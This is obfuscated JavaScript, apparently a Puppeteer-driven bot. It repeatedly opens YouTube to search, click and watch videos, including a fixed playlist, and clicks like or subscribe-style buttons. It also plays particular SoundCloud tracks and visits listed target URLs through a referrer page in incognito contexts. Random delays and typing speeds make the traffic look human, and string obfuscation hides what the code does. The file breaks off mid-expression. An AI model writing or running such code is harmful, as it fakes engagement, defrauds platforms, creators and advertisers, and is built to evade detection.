function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0xa3e * -0x2 + 0x9b0 + -0x1e2c);
    let h = e[f];
    if (c['fMNmKW'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1d93 + -0x1c97 + 0x1 * 0x3a2a, r, s, t = -0x5ae * -0x1 + 0x1 * -0x30d + -0x2a1; s = m['charAt'](t++); ~s && (r = q % (-0x1 * -0x259b + 0x4a * -0xa + 0xb91 * -0x3) ? r * (-0x2647 + -0x1 * -0x575 + 0x2112 * 0x1) + s : s, q++ % (-0x2 * -0x81b + -0xf11 + -0x11 * 0x11)) ? o += String['fromCharCode'](-0x4e3 * -0x1 + -0x57 * 0x41 + 0x611 * 0x3 & r >> (-(-0xb7a + -0x1de + 0xd5a) * q & 0x793 + -0x66c + 0x11 * -0x11)) : 0x408 + -0x552 + 0x14a) {
          s = n['indexOf'](s);
        }
        for (let u = 0x4 * 0x2bd + -0x7a9 + -0x119 * 0x3, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1 * 0x1e85 + 0x5df + 0x18b6 * 0x1))['slice'](-(-0x2044 + -0x47 * 0x21 + 0x1f9 * 0x15));
        }
        return decodeURIComponent(p);
      };
      c['eSFCBD'] = i, b = arguments, c['fMNmKW'] = !![];
    }
    const j = e[0x3 * 0x72f + -0xa85 + 0x4 * -0x2c2],
      k = f + j,
      l = b[k];
    return !l ? (h = c['eSFCBD'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const a7 = c,
  a6 = b,
  a5 = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x22e9 + -0x1 * -0x259b + 0x35 * -0xd))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1519 + -0x91d * -0x4 + -0x1 * 0x398d), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1 * -0x1115 + -0x5 * -0x2dc4 + -0x80b9 + (-0x546b * -0x1 + -0x1fe6 * 0x2 + -0x25f9 * -0x1) * random()) : await standardWaitForNetIdle(f), await wait(0x5b1 + 0x1a5f + -0xc88 + (-0x1 * 0x24df + -0x390e + 0x84fd) * random()), -0x2 * -0x1072 + 0x1a06 + -0x3ae9;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x174c + 0x4 * 0x2bd + 0x1fe0), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x52e + 0x17da * -0x1 + 0x12ad;
}
async function randomWait() {
  return await wait(-0x326 * 0x8 + 0xba0 + 0x2118 + (0x2f * 0x25 + -0x5 * 0x4be + 0x1f * 0x12d) * random()), -0x1 * 0xf8b + 0xa * 0x265 + -0x866;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = c;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + R(0x1e) + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x23aa + 0x1b0e + -0x2 * 0x1f5c, 0x1d9b + -0x21c9 + 0x3 * 0x167), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xf45a + 0xe4b * 0x1a + -0x17d98) * getRandomInt(0xeb6 + 0x1 * 0x3b0 + -0x4 * 0x499, -0x25 + -0x20cb + 0x20f5), h)), -0x7be + 0x1d18 + -0x445 * 0x5;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1eff + -0x355 * 0x1 + 0x2254;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x4 * -0x4f9 + -0x1 * 0xba5 + 0x1f8a]['split']('\x20');
    for (let k = -0xa9 * 0x1d + -0xf * -0xcf + 0x704; k < i['length']; k += 0x2 * 0x135b + 0x1 * 0x1bf + -0x2873)
      j += i[k] * h[i[k + (-0x2294 + -0xb4 * 0x5 + 0x2619 * 0x1)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const T = d,
      S = c,
      j = Array['from'](document[S(0x22) + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1 * -0x355 + -0xa0 * 0x13 + 0x891)['map'](l => Array['from'](l['children']))['flat'](0xd3 * -0x17 + -0x1c36 + 0x2f2c)['map'](l => l['childNodes'][0x87 * -0x9 + -0x140d + -0x38b * -0x7][T(0x1f)][0x14f + 0x7d3 * 0x4 + 0x11 * -0x1eb]['childNodes'][-0x14a4 + 0x7d8 + 0xccd]['childNodes'][0x1394 + -0x25c6 + 0x11 * 0x112]['childNodes'][-0x136b + 0xdd5 * 0x2 + -0x83e]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x232d + 0x15a + 0x25bb * 0x1, -0x2 * 0xb48 + 0x26c0 + 0x358)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x5db * -0x13 + -0x443 * 0x1 + 0x1e * -0x19d);
  const h = await getMaxTime(f),
    i = Math['min']((0x1637c * 0x1 + 0x5eea * 0x2 + -0x1f18 * 0xa) * getRandomInt(-0x82 * 0xe + -0x2249 + 0x2967, -0x4 * 0x40f + -0x5e4 + 0x1625 * 0x1), h);
  return await wait(i), 0x1aa7 + -0x209e + 0x5f8;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0xa3e * -0x2 + 0x9b0 + -0x1e2c);
    let h = e[f];
    if (b['CgjgBs'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1d93 + -0x1c97 + 0x1 * 0x3a2a, s, t, u = -0x5ae * -0x1 + 0x1 * -0x30d + -0x2a1; t = n['charAt'](u++); ~t && (s = r % (-0x1 * -0x259b + 0x4a * -0xa + 0xb91 * -0x3) ? s * (-0x2647 + -0x1 * -0x575 + 0x2112 * 0x1) + t : t, r++ % (-0x2 * -0x81b + -0xf11 + -0x11 * 0x11)) ? p += String['fromCharCode'](-0x4e3 * -0x1 + -0x57 * 0x41 + 0x611 * 0x3 & s >> (-(-0xb7a + -0x1de + 0xd5a) * r & 0x793 + -0x66c + 0x11 * -0x11)) : 0x408 + -0x552 + 0x14a) {
          t = o['indexOf'](t);
        }
        for (let v = 0x4 * 0x2bd + -0x7a9 + -0x119 * 0x3, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1 * 0x1e85 + 0x5df + 0x18b6 * 0x1))['slice'](-(-0x2044 + -0x47 * 0x21 + 0x1f9 * 0x15));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x3 * 0x72f + -0xa85 + 0x4 * -0x2c2,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x329 * 0x3 + 0x221 * 0x9 + -0x9ae; u < -0x1532 + -0x20d7 * -0x1 + -0xaa5; u++) {
          p[u] = u;
        }
        for (u = 0x5ad * -0x4 + -0x134 * -0xd + 0x71 * 0x10; u < -0x51 * 0x2b + 0x1 * 0xeb6 + -0x1 * 0x1b; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x25 + -0x20cb + 0x21f0), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x7be + 0x1d18 + -0x38f * 0x6, q = -0x1eff + -0x355 * 0x1 + 0x2254;
        for (let v = 0x4 * -0x4f9 + -0x1 * 0xba5 + 0x1f89; v < n['length']; v++) {
          u = (u + (-0xa9 * 0x1d + -0xf * -0xcf + 0x705)) % (0x2 * 0x135b + 0x1 * 0x1bf + -0x2775), q = (q + p[u]) % (-0x2294 + -0xb4 * 0x5 + 0x138c * 0x2), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * -0x355 + -0xa0 * 0x13 + 0x98b)]);
        }
        return t;
      };
      b['HmjseO'] = m, c = arguments, b['CgjgBs'] = !![];
    }
    const j = e[0xd3 * -0x17 + -0x1c36 + 0x2f2b],
      k = f + j,
      l = c[k];
    return !l ? (b['KcGesu'] === undefined && (b['KcGesu'] = !![]), h = b['HmjseO'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function frontScreenActions(f) {
  const U = c;
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + U(0x15)), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const W = c,
      V = d;
    var h;
    (h = Array[V(0x12)](document['getElement' + 'sByClassNa' + 'me']('style-scop' + W(0x13) + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1b4 + 0x297 + -0xe3]['children'][0x15da + 0x25f9 + -0x3bd3]['children'][-0xcfb + 0x18b3 + 0x78 * -0x19]['children'][-0x138a + 0x28 * 0xdc + -0x1a6 * 0x9]['children'][0x997 * 0x3 + 0x1943 + -0xd82 * 0x4]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x49 * 0x55 + 0x5d * -0x6b + 0xea3;
}
async function searchAndView(f) {
  const Z = c,
    Y = d;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const X = d;
    let j = Array['from'](document['querySelec' + 'torAll'](X(0x3)));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + Y(0x1d), searchTerms['random'](), {
    'delay': -0x1596 + 0x143b * -0x1 + 0x2a35 + (0x15c3 + -0x1c10 + 0x1 * 0x67f) * random()
  }), await wait(-0xa + -0xe6d + 0x106b + (0x13f2 + 0x1dbf + -0x3085) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x41 * 0x73 + -0x1163 + 0xbce * -0x1]['childNodes'][-0xae5 * 0x1 + 0x100b + -0x1b7 * 0x3]['childNodes'][0xe8 + -0x1780 + 0x59 * 0x41]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x2 * -0xb25 + 0x1735 * -0x1 + 0x3cb * 0xc]['childNodes'][-0x206c + 0x6de + 0x198e]['childNodes'][0x14 * 0x1b + 0x953 + -0xb6d]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1c17 + 0x18 + 0xe17 * -0x2),
          r = -0x81 * 0x29 + -0x7ed * 0x3 + 0x2c70;
        for (let u = -0x1e57 + -0x109a + -0x2ef1 * -0x1; u < q['length']; u += 0x49 * -0x67 + 0x2cf * -0x7 + -0x1 * -0x310a)
          r += q[u] * k[q[u + (-0x2104 * -0x1 + 0x693 + -0x2796)]];
        return r;
      }(n);
  });
  await wait((-0x4 * -0x1049 + 0x2f87 + -0x6d * 0x7f) * Math['random']()), await f[Z(0x17)]('#__hookedV' + 'idToClick');
  let i = Math['min']((0x3c48 + -0x7195 * 0x3 + 0x202d7) * getRandomInt(0x22c * -0x10 + 0x115 + 0x14 * 0x1af, 0x1c * -0x8c + -0x1 * -0x7b5 + -0x67 * -0x13), h + (0x265b * 0x1 + 0xc8 * 0xb + -0x1b6b));
  return await wait(i), -0x48 * -0x21 + 0xf8 * 0x21 + -0x293f;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1208 * 0x1 + 0x1ebf + -0xcb7), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x9 * 0x18c + -0x1 * -0x1300 + -0xa9a * 0x2 + (0x188a + 0x20e * -0xd + 0x614) * Math['random']());
    });
  }, -0xa4d * -0x4 + -0x1 * -0x1f7f + -0x2d5b);
  await wait(-0x3a99f * 0x2 + 0xfe4 + 0xbd73a);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x13f5d + -0xb730 + 0x6233) * getRandomInt(-0x10a5 + -0x2327 + -0x19e8 * -0x2, -0x1 * 0x148f + -0x1 * 0x19be + 0x1733 * 0x2)), clearInterval(h), -0x15f9 + -0x1640 + 0x11 * 0x29a;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x679 * 0x4 + 0x2 * 0x1d9 + -0x7 * 0x43a;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x866 + 0x1c13 + 0x18 * -0x185;
    await randomWait();
  }
  return -0xad * 0x17 + -0x14c1 + 0x244d;
}

function fetchRandomSC() {
  const a1 = b,
    a0 = d;
  return Math['random']() <= 0x407 + -0x123 + -0x2e4 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + a0(0x10) + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x293 + 0x3a * -0xa9 + 0x23b7 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + a1(0x20, 'kp41') + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + a0(0xf) + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xf56 + 0x10 * 0x1f5 + -0x2ea6 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1ba1 * -0x1 + -0x4 * -0x451 + -0x2ce5;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1 * -0x15c9e + 0xde17 + -0x18aed + getRandomInt(-0x2e6 * 0x1 + -0x2abd + 0x683b, 0x1239 * 0x5 + 0x2 * 0x3ca6 + -0x5f39 * 0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x7 * -0x20b + -0x10a3 + -0x1ef1 * -0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x175 * 0x3 + 0xd92 * 0x1 + -0x933;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x2ee + -0x46 * -0x61 + -0x1d74, 0x18aa + -0x17e5 + -0x15 * 0x7)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0xa1 * -0x36 + -0x21a1 + 0x1 * 0x77b + floor((-0x4e3 * -0x3 + -0x1a * 0xa0 + -0x57f * -0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        const a3 = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x21f * 0x4c5336 + -0xae1f0 * -0x7c1 + 0x51 * 0x289837a),
          0x851cd7 + 0x5144ad + -0x566184,
          0x29d8 * -0x6 + 0xcd * 0xa9 + 0xf3bb,
          0x228 + -0x1 * -0x17ec + -0x1994
        ], y = [
          0x509 + 0x15bb + -0x6ab * 0x4,
          -0x26 * -0x7b + 0x3b2 * -0x1 + -0xe80,
          -0x2ef * 0x1 + -0x285 + -0x57c * -0x1,
          -0xb9c + -0x864 + -0x50 * -0x40
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xf4d + -0x575 + -0xb * 0xe5)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x22c3 + 0x8 * -0xa1 + 0x3d * 0xa7; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const a2 = c;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xb * -0x156 + -0xc * -0x2ae + -0x2eda) === N['length'])
                  return J(N);
              }
              return K[a2(0x11)]('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1e8e + 0x225f + 0x5e7 * -0xb] = A[-0x1 * -0x2237 + -0x2c * -0xbc + -0x4277] = A[-0x8 * 0x1d2 + 0x25e9 + -0x1758] = A[-0xabb + 0x1dec + 0x665 * -0x3] = A[0x331 + 0x25c * -0xb + 0x16c6] = A[0x149e + 0x147c + -0x2916] = A[0x8a1 + 0x1e71 + 0xd * -0x301] = A[0x2031 + -0x3 * 0x7fb + -0x83a] = A[0x11f3 * -0x1 + -0x2654 + 0x1c27 * 0x2] = A[-0x2204 + -0x4 * 0x78e + 0x4044] = A[0x233b + -0x5bf * -0x2 + -0x10 * 0x2eb] = A[-0x1 * 0x2361 + -0x17 * -0xa7 + 0x6ce * 0x3] = A[0xfd6 + 0xe9 * -0x29 + 0x1586] = A[0x43f * 0x5 + -0x1faf + -0x4 * -0x2a0] = A[0x25 * -0xd9 + 0x94 * -0x2 + 0x2092] = A[0x2ff + -0x1 * 0x1d89 + -0x1a98 * -0x1] = A[0x22a8 + 0x8 * -0x319 + -0x9d1] = 0xf53 * 0x1 + 0x47 * 0x35 + -0xa02 * 0x3, this['blocks'] = A) : this['blocks'] = [
                -0x3ad + -0x757 * -0x1 + -0x3aa,
                -0x5 * -0x5e5 + 0x22b1 + -0x402a,
                -0x4 * -0x241 + 0x69 * -0x39 + 0xe5d,
                -0x1 * 0x123b + -0x1d21 + -0x2f5c * -0x1,
                0x4 * -0x88f + -0x261c + 0x4858,
                -0x950 + 0x1 * 0x251b + -0x58f * 0x5,
                0x2d9 + -0x1dd1 + 0x8 * 0x35f,
                -0x2433 + -0x29 * -0x93 + 0xca8,
                0x196 * 0xd + 0x292 * 0xe + -0x389a,
                0x674 + -0xd6c + -0x6f8 * -0x1,
                0x2435 + 0x16 * -0x16c + -0x4ed,
                0x205d + 0xd85 * -0x1 + -0x12d8,
                -0x1 * -0x1357 + 0x125d + 0x96d * -0x4,
                -0x378 * -0x1 + -0xf38 + 0xbc0,
                0x21cb + 0x1121 * 0x1 + -0x32ec,
                0x2 * 0x6e + 0x1a6 + -0x282,
                0x885 * 0x2 + -0x2 * 0xb16 + 0x522
              ], this['h0'] = -0x8bc92d9b + -0x357658 * 0x3a1 + 0x1b510c5f4, this['h1'] = 0x71 * -0x2c50b81 + 0x589f9d85 * 0x2 + 0x50 * 0x4b1b4db, this['h2'] = 0x3b3d6dd8 * 0x5 + -0x29 * 0x1462e5 + -0x8c34718d * 0x1, this['h3'] = -0x19ca7c91 + 0x4ef55c7 * -0x5 + 0x42a97dea, this['h4'] = -0x1490bf8bd + 0xd7342b7b + 0x135aaaf32, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1 * -0x1589 + -0x3a5 + 0x24a * 0xb, this['finalized'] = this['hashed'] = 0x10e7 + -0x1 * -0x540 + 0x1627 * -0x1, this['first'] = -0x7 * -0x16f + 0xc3 * 0x25 + -0x2637;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1073 + 0x570 + 0xb03 * 0x1, O = J['length'] || 0x26 * 0x3b + -0x1 * 0x1467 + 0x10f * 0xb, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x320 + 0x2 * 0x52f + -0x73e, P[0x677 * -0x4 + 0x43 + 0x1999] = this['block'], P[0x3f3 * -0x1 + -0xe5 * -0xb + 0x175 * -0x4] = P[0x1d * 0x65 + -0x1 * 0xceb + 0x17b] = P[-0x1a9 * 0x7 + -0x15a * -0x2 + 0x1c9 * 0x5] = P[0x1277 * 0x1 + -0x504 * -0x1 + 0xbbc * -0x2] = P[-0x2 * -0x3c9 + 0xdf1 + 0x1 * -0x157f] = P[0x12cc + -0x68 + 0x125f * -0x1] = P[0x35 * 0x19 + 0x1def + -0x2316] = P[-0x2222 + -0xbda * 0x2 + 0x39dd] = P[-0x50d * -0x1 + 0x103c * 0x2 + -0x257d] = P[0x80b * 0x3 + -0x18c1 + 0xa9] = P[-0x1764 + 0x384 + 0x13ea] = P[0xc9b * -0x2 + 0x2510 + -0xbcf] = P[0x6 * -0x5ec + -0x7db * 0x3 + 0x3b25] = P[-0x1035 * -0x1 + 0x25c2 + -0x35ea] = P[0x1d7d * -0x1 + -0x264b + -0x1c9 * -0x26] = P[0x1 * -0x12c1 + -0x4b7 + 0x13d * 0x13] = 0x9e * 0x2e + 0x5 * -0x75 + 0x1a1b * -0x1), K) {
                    for (N = this['start']; M < O && N < 0x1 * -0x1d79 + 0x1a29 + 0x4 * 0xe4; ++M)
                      P[N >> -0x2681 + 0x2 * -0x9d9 + -0x1367 * -0x3] |= J[M] << y[0xc40 + 0x12e * -0x12 + 0x8ff & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x8e * 0x1f + 0x6 * -0x601 + -0x2 * -0x1abc; ++M)
                      (L = J['charCodeAt'](M)) < 0x23a2 + -0x4 * 0x961 + -0xa * -0x3d ? P[N >> 0x64 * 0x23 + 0x11b2 + -0x1f5c] |= L << y[-0x3 * -0xb79 + 0x2 * -0x7b5 + -0x12fe & N++] : L < -0x1b * -0x9d + -0xc * 0x85 + -0x253 ? (P[N >> -0x1fbf + 0xfc6 + -0x1 * -0xffb] |= (-0x616 + -0x11e6 + 0x18bc | L >> 0x1c05 + -0x1d88 + -0x3 * -0x83) << y[0x1bfb + -0x130d + -0x8eb & N++], P[N >> -0x1 * 0x283 + -0x1 * -0x1eff + 0x5b2 * -0x5] |= (0x2 * 0x10b9 + 0x17 * -0x7c + 0x15ce * -0x1 | -0x216d + -0x19 * 0x7 + 0x6df * 0x5 & L) << y[-0x1a53 + -0x10 * -0x1ff + 0x3 * -0x1de & N++]) : L < -0x1c5 * -0x58 + -0x12607 + 0x1624f || L >= -0x251 * -0x52 + 0x8ec9 + -0x6cbb ? (P[N >> 0x1 * 0x1e5b + -0x15 * 0x17b + 0xbe] |= (0x8d3 + -0x1e4b + 0x1658 | L >> -0x2589 + -0x34 * -0x40 + 0x1895) << y[0x219b + 0xe57 * -0x1 + -0x1341 & N++], P[N >> -0xf30 + -0x1 * -0x175e + 0x2 * -0x416] |= (-0x259 * -0x3 + 0x46 * 0x4d + 0x1d7 * -0xf | L >> -0x1619 + 0x30 * -0x26 + -0x1d3f * -0x1 & 0x1451 * -0x1 + -0x178 * 0x5 + 0x1be8) << y[-0x5 * 0x52 + 0xe5 * 0x1e + -0x1939 & N++], P[N >> -0x9a5 + 0x25e4 + -0x1c3d] |= (0x201f + 0x230c + -0x42ab * 0x1 | 0x1f9d + 0xcc0 * -0x1 + -0x129e & L) << y[-0x199 * 0x1 + -0x4 * 0x12a + 0x644 & N++]) : (L = 0x1 * 0x19ee5 + -0xdfe3 * 0x1 + -0x207f * -0x2 + ((-0x15ee * -0x1 + 0xcac + -0x61f * 0x5 & L) << -0x107 * 0x15 + -0x1e65 + -0x1156 * -0x3 | 0x1bb * -0x5 + -0x989 + 0x162f & J['charCodeAt'](++M)), P[N >> -0x1 * 0x2290 + 0x4 * -0x6bf + 0x3d8e] |= (0x32e + 0x4 * -0x95b + 0x232e | L >> 0x2421 + -0xc97 + -0x1778) << y[0x23e8 + -0xce9 + -0x4 * 0x5bf & N++], P[N >> 0x1465 + 0x255a * 0x1 + -0x3 * 0x133f] |= (0x16bf + 0x1646 + -0x2c85 | L >> -0xb5 * 0xd + -0x3f2 + 0xd2f & -0x258e + 0x1d3a + 0x5 * 0x1b7) << y[-0x4ff + -0x1e07 + -0x1 * -0x2309 & N++], P[N >> 0x1643 * -0x1 + 0x9a0 + 0xca5] |= (-0x14c + 0x56a + 0x2 * -0x1cf | L >> -0x1 * 0x207e + 0x11c + 0x1f68 & 0x20 * -0x2 + -0x22bb + 0x233a) << y[-0x4e0 * 0x1 + 0x1b41 + -0x165e & N++], P[N >> 0x1966 * -0x1 + 0x224f + -0x8e7] |= (-0x29d * -0xa + -0x188f + -0x113 | 0x1e3e + 